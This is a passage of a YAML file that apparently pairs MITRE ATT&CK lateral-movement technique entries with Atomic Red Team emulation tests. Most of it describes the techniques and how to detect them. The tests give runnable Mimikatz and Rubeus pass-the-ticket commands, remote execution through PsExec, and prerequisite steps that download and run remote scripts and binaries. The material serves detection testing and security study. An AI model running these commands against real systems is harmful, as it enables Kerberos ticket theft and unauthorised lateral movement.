      - url: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
        description: Nelson, M. (2017, November 16). Lateral Movement using Outlook's
          CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.
        source_name: Enigma Outlook DCOM Lateral Movement Nov 2017
      - url: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
        description: Nelson, M. (2017, January 5). Lateral Movement using the MMC20
          Application COM Object. Retrieved November 21, 2017.
        source_name: Enigma MMC20 COM Jan 2017
      - url: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
        description: 'Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round
          2. Retrieved November 21, 2017.'
        source_name: Enigma DCOM Lateral Movement Jan 2017
      - url: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
        description: Nelson, M. (2017, September 11). Lateral Movement using Excel.Application
          and DCOM. Retrieved November 21, 2017.
        source_name: Enigma Excel DCOM Sept 2017
      - url: https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
        description: Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral
          movement via DCOM. Retrieved November 21, 2017.
        source_name: Cyberreason DCOM DDE Lateral Movement Nov 2017
      modified: '2020-03-30T13:36:10.069Z'
      name: Component Object Model and Distributed COM
      description: "**This technique has been deprecated. Please use [Distributed
        Component Object Model](https://attack.mitre.org/techniques/T1021/003) and
        [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**\n\nAdversaries
        may use the Windows Component Object Model (COM) and Distributed Component
        Object Model (DCOM) for local code execution or to execute on remote systems
        as part of lateral movement. \n\nCOM is a component of the native Windows
        application programming interface (API) that enables interaction between software
        objects, or executable code that implements one or more interfaces.(Citation:
        Fireeye Hunting COM June 2019) Through COM, a client object can call methods
        of server objects, which are typically Dynamic Link Libraries (DLL) or executables
        (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends
        the functionality of Component Object Model (COM) (Citation: Microsoft COM)
        beyond a local computer using remote procedure call (RPC) technology.(Citation:
        Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote
        server COM objects are specified by access control lists (ACL) in the Registry.
        (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation:
        Microsoft System Wide Com Keys) By default, only Administrators may remotely
        activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM
        for local command and/or payload execution. Various COM interfaces are exposed
        that can be abused to invoke arbitrary execution via a variety of programming
        languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific
        COM objects also exists to directly perform functions beyond code execution,
        such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
        fileless download/execution, and other adversary behaviors such as Privilege
        Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
        ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral
        movement. Through DCOM, adversaries operating in the context of an appropriately
        privileged user can remotely obtain arbitrary and even direct shellcode execution
        through Office applications (Citation: Enigma Outlook DCOM Lateral Movement
        Nov 2017) as well as other Windows objects that contain insecure methods.(Citation:
        Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017)
        DCOM can also execute macros in existing documents (Citation: Enigma Excel
        DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173)
        (DDE) execution directly through a COM created instance of a Microsoft Office
        application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing
        the need for a malicious document."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1086), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)

        Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

        Monitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.
      x_mitre_deprecated: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - User
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1550.003:
    technique:
      modified: '2023-03-30T21:01:38.108Z'
      name: 'Use Alternate Authentication Material: Pass the Ticket'
      description: |-
        Adversaries may â€œpass the ticketâ€? using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

        When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

        A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

        A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

        Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Vincent Le Toux
      - Ryan Becwar
      x_mitre_detection: |-
        Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

        Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to "Integrity check on decrypted field failed" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Authentication'
      - 'Active Directory: Active Directory Credential Request'
      x_mitre_defense_bypassed:
      - System Access Controls
      x_mitre_system_requirements:
      - Kerberos authentication enabled
      type: attack-pattern
      id: attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926
      created: '2020-01-30T17:03:43.072Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1550/003
        external_id: T1550.003
      - source_name: ADSecurity AD Kerberos Attacks
        description: Metcalf, S. (2014, November 22). Mimikatz and Active Directory
          Kerberos Attacks. Retrieved June 2, 2016.
        url: https://adsecurity.org/?p=556
      - source_name: GentilKiwi Pass the Ticket
        description: Deply, B. (2014, January 13). Pass the ticket. Retrieved June
          2, 2016.
        url: http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
      - source_name: Campbell 2014
        description: Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December
          4, 2014.
        url: http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf
      - source_name: Stealthbits Overpass-the-Hash
        description: Warren, J. (2019, February 26). How to Detect Overpass-the-Hash
          Attacks. Retrieved February 4, 2021.
        url: https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/
      - source_name: CERT-EU Golden Ticket Protection
        description: Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016,
          April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.
        url: https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1550.003
    atomic_tests:
    - name: Mimikatz Kerberos Ticket Attack
      auto_generated_guid: dbf38128-7ba7-4776-bedf-cc2eed432098
      description: 'Similar to PTH, but attacking Kerberos

        '
      supported_platforms:
      - windows
      input_arguments:
        ticket:
          description: Ticket file name usually format of 'id-username\@domain.kirbi'
            (e.g. can be dumped by "sekurlsa::tickets /export" module)
          type: string
          default: 
        mimikatz_exe:
          description: Path of the Mimikatz binary
          type: path
          default: PathToAtomicsFolder\T1550.003\bin\x64\mimikatz.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})

          '
        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path #{mimikatz_exe}
          | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
      executor:
        command: '#{mimikatz_exe} "kerberos::ptt #{ticket}"

          '
        name: command_prompt
    - name: Rubeus Kerberos Pass The Ticket
      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
      description: |
        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
      supported_platforms:
      - windows
      input_arguments:
        target:
          description: Remote system to request the TGT from
          type: string
          default: localhost
        user_name:
          description: username associated with the ticket (privileged account not
            required)
          type: string
          default: Administrator
        password:
          description: password for user_name
          type: string
          default: Password
        domain:
          description: domain
          type: string
          default: "$Env:USERDOMAIN"
        rubeus_path:
          description: Path of the Rubeus binary
          type: path
          default: "$Env:TEMP\\rubeus.exe"
        rubeus_url:
          description: URL of Rubeus executable
          type: url
          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
        psexec_path:
          description: Path of the PsExec binary
          type: string
          default: C:\PSTools\PsExec.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})

          '
        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}

          '
      - description: 'PsExec must exist on disk at specified location (#{psexec_path})

          '
        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
      executor:
        name: powershell
        elevation_required: true
        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
  T1051:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db
      type: attack-pattern
      created: '2017-05-31T21:30:46.047Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1051
        url: https://attack.mitre.org/techniques/T1051
      - external_id: CAPEC-563
        source_name: capec
        url: https://capec.mitre.org/data/definitions/563.html
      - description: 'Microsoft. (2016, October 20). How to: Find the Web Application
          Root. Retrieved July 27, 2018.'
        source_name: Microsoft Web Root OCT 2016
      - url: http://httpd.apache.org/docs/2.4/getting-started.html#content
        description: Apache. (n.d.). Apache HTTP Server Version 2.4 Documentation
          - Web Site Content. Retrieved July 27, 2018.
        source_name: Apache Server 2018
      - url: https://www.webroot.com/blog/2011/02/22/malicious-php-scripts-on-the-rise/
        description: Brandt, Andrew. (2011, February 22). Malicious PHP Scripts on
          the Rise. Retrieved October 3, 2018.
        source_name: Webroot PHP 2011
      modified: '2020-03-30T13:56:55.356Z'
      name: Shared Webroot
      description: |-
        **This technique has been deprecated and should no longer be used.**

        Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.

        This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Use file and process monitoring to detect when files are
        written to a Web server by a process that is not the normal Web server process
        or when files are written outside of normal administrative time periods. Use
        process monitoring to identify normal processes that run on the Web server
        and detect processes that are not typically executed.
      x_mitre_deprecated: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_system_requirements:
      - Shared webroot directory on remote system
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1021.007:
    technique:
      modified: '2023-04-14T22:27:04.095Z'
      name: Cloud Services
      description: "Adversaries may log into accessible cloud services within a compromised
        environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        that are synchronized with or federated to on-premises user identities. The
        adversary may then perform management actions or access cloud-hosted resources
        as the logged-on user. \n\nMany enterprises federate centrally managed user
        identities to cloud services, allowing users to login with their domain credentials
        in order to access the cloud control plane. Similarly, adversaries may connect
        to available cloud services through the web console or through the cloud command
        line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)),
        using commands such as <code>Connect-AZAccount</code> for Azure PowerShell,
        <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud
        auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries
        may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001)
        instead of a username and password. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Office 365
      - Azure AD
      - SaaS
      - IaaS
      - Google Workspace
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      type: attack-pattern
      id: attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0
      created: '2023-02-21T19:38:13.371Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/007
        external_id: T1021.007
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1072:
    technique:
      modified: '2023-03-30T21:01:36.669Z'
      name: Software Deployment Tools
      description: |-
        Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).

        Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

        The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Shane Tully, @securitygypsy
      x_mitre_detection: "Detection methods will vary depending on the type of third-party
        software or system and how it is typically used. \n\nThe same investigation
        process can be applied here as with other potentially malicious activities
        where the distribution vector is initially unknown but the resulting activity
        follows a discernible pattern. Analyze the process execution trees, historical
        activities from the third-party application (such as what types of files are
        usually pushed), and the resulting activities or events from the file/binary/script
        pushed to systems. \n\nOften these third-party applications will have logs
        of their own that can be collected and correlated with other data from the
        environment. Ensure that third-party application logs are on-boarded to the
        enterprise logging system and the logs are regularly reviewed. Audit software
        deployment logs and look for suspicious or unauthorized activity. A system
        not typically used to push software to clients that suddenly is used for such
        a task outside of a known admin function may be suspicious. Monitor account
        login activity on these applications to detect suspicious/abnormal usage.\n\nPerform
        application deployment at regular times so that irregular deployment activity
        stands out. Monitor process activity that does not correlate to known good
        software. Monitor account login activity on the deployment system."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '2.1'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414
      created: '2017-05-31T21:30:57.201Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1072
        external_id: T1072
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1072
    atomic_tests:
    - name: Radmin Viewer Utility
      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
      description: 'An adversary may use Radmin Viewer Utility to remotely control
        Windows device, this will start the radmin console.

        '
      supported_platforms:
      - windows
      input_arguments:
        radmin_installer:
          description: Radmin Viewer installer
          type: path
          default: RadminViewer.msi
        radmin_exe:
          description: The radmin.exe executable from RadminViewer.msi
          type: path
          default: Radmin Viewer 3/Radmin.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Radmin Viewer Utility must be installed at specified location
          (#{radmin_exe})

          '
        prereq_command: 'if (Test-Path "${env:ProgramFiles(x86)}/#{radmin_exe}") {exit
          0} else {exit 1}

          '
        get_prereq_command: |
          Write-Host Downloading radmin installer
          (New-Object Net.WebClient).DownloadFile("https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi","$ENV:Temp\#{radmin_installer}")
          Write-Host Install Radmin
          Start-Process msiexec  -Wait -ArgumentList /i , $ENV:Temp\#{radmin_installer}, /qn
      executor:
        name: command_prompt
        elevation_required: true
        command: '"%PROGRAMFILES(x86)%/#{radmin_exe}"

          '
    - name: PDQ Deploy RAT
      auto_generated_guid: e447b83b-a698-4feb-bed1-a7aaf45c3443
      description: 'An adversary may use PDQ Deploy Software to deploy the Remote
        Adminstartion Tool, this will start the PDQ console.

        '
      supported_platforms:
      - windows
      input_arguments:
        PDQ_Deploy_installer:
          description: PDQ Deploy Install
          type: path
          default: PDQDeploysetup.exe
        PDQ_Deploy_exe:
          description: The PDQDeployConsole.exe executable from PDQDeploysetup.exe
          type: path
          default: Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})

          '
        prereq_command: 'if (Test-Path "${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}")
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Write-Host Downloading PDQ Deploy installer
          (New-Object Net.WebClient).DownloadFile("https://download.pdq.com/release/19/Deploy_19.3.350.0.exe","$ENV:Temp\#{PDQ_Deploy_installer}")
          Write-Host Install PDQ Deploy
          Start-Process $ENV:Temp\#{PDQ_Deploy_installer} -Wait -ArgumentList "/s"
      executor:
        name: command_prompt
        elevation_required: true
        command: '"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"

          '
  T1210:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - ExtraHop
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1210
        url: https://attack.mitre.org/techniques/T1210
      - url: https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/
        description: CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows
          SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.
        source_name: CIS Multiple SMB Vulnerabilities
      - url: https://nvd.nist.gov/vuln/detail/CVE-2017-0176
        description: National Vulnerability Database. (2017, June 22). CVE-2017-0176
          Detail. Retrieved April 3, 2018.
        source_name: NVD CVE-2017-0176
      - url: https://nvd.nist.gov/vuln/detail/CVE-2016-6662
        description: National Vulnerability Database. (2017, February 2). CVE-2016-6662
          Detail. Retrieved April 3, 2018.
        source_name: NVD CVE-2016-6662
      - url: https://nvd.nist.gov/vuln/detail/CVE-2014-7169
        description: National Vulnerability Database. (2017, September 24). CVE-2014-7169
          Detail. Retrieved April 3, 2018.
        source_name: NVD CVE-2014-7169
      modified: '2022-02-24T15:06:46.006Z'
      name: Exploitation of Remote Services
      description: |-
        Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Â A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

        An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

        There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)

        Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Detecting software exploitation may be difficult depending
        on the tools available. Software exploits may not always succeed or may cause
        the exploited process to become unstable or crash. Also look for behavior
        on the endpoint system that might indicate successful compromise, such as
        abnormal behavior of the processes. This could include suspicious files written
        to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055)
        for attempts to hide execution, evidence of [Discovery](https://attack.mitre.org/tactics/TA0007),
        or other unusual network traffic that may indicate additional tools transferred
        to the system.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - User
      x_mitre_system_requirements:
      - Unpatched software or otherwise vulnerable target. Depending on the target
        and goal, the system and exploitable service may need to be remotely accessible
        from the internal network.
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1534:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Office 365
      - SaaS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Tim MalcomVetter
      - Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747
      type: attack-pattern
      created: '2019-09-04T19:26:12.441Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - external_id: T1534
        source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1534
      - description: Chris Taylor. (2017, October 5). When Phishing Starts from the
          Inside. Retrieved October 8, 2019.
        url: https://blog.trendmicro.com/phishing-starts-inside/
        source_name: Trend Micro When Phishing Starts from the Inside 2017
      - description: THE FINANCIAL TIMES. (2019, September 2). A sobering day. Retrieved
          October 8, 2019.
        url: https://labs.ft.com/2013/05/a-sobering-day/?mhq5j=e6
        source_name: THE FINANCIAL TIMES LTD 2019.
      modified: '2022-03-08T21:29:30.249Z'
      name: Internal Spearphishing
      description: |-
        Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)

        Adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.

        There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Network intrusion detection systems and email gateways usually
        do not scan internal email, but an organization can leverage the journaling-based
        solution which sends a copy of emails to a security service for offline analysis
        or incorporate service-integrated solutions using on-premise or API-based
        integrations to help detect internal spearphishing campaigns.(Citation: Trend
        Micro When Phishing Starts from the Inside 2017)'
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Application Log: Application Log Content'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1097:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ryan Becwar
      - Vincent Le Toux
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c
      type: attack-pattern
      created: '2017-05-31T21:31:11.623Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1097
        url: https://attack.mitre.org/techniques/T1097
      - external_id: CAPEC-645
        source_name: capec
        url: https://capec.mitre.org/data/definitions/645.html
      - url: https://adsecurity.org/?p=556
        description: Metcalf, S. (2014, November 22). Mimikatz and Active Directory
          Kerberos Attacks. Retrieved June 2, 2016.
        source_name: ADSecurity AD Kerberos Attacks
